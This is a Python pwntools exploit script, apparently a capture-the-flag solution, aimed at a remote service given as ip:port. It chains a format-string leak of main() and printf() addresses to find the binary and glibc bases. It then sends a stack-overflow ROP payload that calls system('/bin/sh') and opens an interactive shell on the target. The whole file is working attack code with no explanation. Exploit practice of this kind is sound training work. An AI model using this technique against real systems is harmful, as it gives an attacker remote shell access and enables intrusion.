#!/usr/bin/env python3

from pwn import context, log, p64, remote, sys, u64

context.bits = 64
context.arch = 'amd64'


def get_process():
    if len(sys.argv) != 2:
        log.error(f'Usage {sys.argv[0]} <ip>:<port>')

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def dump(p, i: int, f: str = 'lx', prefix: bytes = b'') -> bytes:
    p.sendlineafter(b'> ', prefix + f'%{i}${f}'.encode())
    return p.recvline().strip()


def main():
    p = get_process()

    main_position = 20
    main_addr = int(dump(p, main_position).decode(), 16)
    log.info(f'Leaked main() address: {hex(main_addr)}')

    main_offset = 0x1160
    elf_addr = main_addr - main_offset
    log.info(f'Binary base address: {hex(elf_addr)}')
    print()

    printf_plt = elf_addr + 0x110b
    printf_got = printf_plt + 0x2e9d
    printf_offset = 0x64f70
    p.sendlineafter(b'> ', b'%9$s####' + p64(printf_got))
    printf_addr = u64(p.recvline().split(b'####')[0].ljust(8, b'\0'))
    log.success(f'Leaked printf() address: {hex(printf_addr)}')

    glibc_addr = printf_addr - printf_offset
    log.info(f'Glibc base address: {hex(glibc_addr)}')

    pop_rdi_ret_offset = 0x1463
    ret_offset = 0x1464
    system_offset = 0x4f550
    bin_sh_offset = 0x1b3e1a

    pop_rdi_ret = elf_addr + pop_rdi_ret_offset
    ret = elf_addr + ret_offset
    system_addr = glibc_addr + system_offset
    bin_sh_addr = glibc_addr + bin_sh_offset

    offset = 72
    junk = b'A' * offset

    payload  = junk
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh_addr)
    payload += p64(ret)
    payload += p64(system_addr)

    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'>> ', payload)

    p.interactive()


if __name__ == '__main__':
    main()
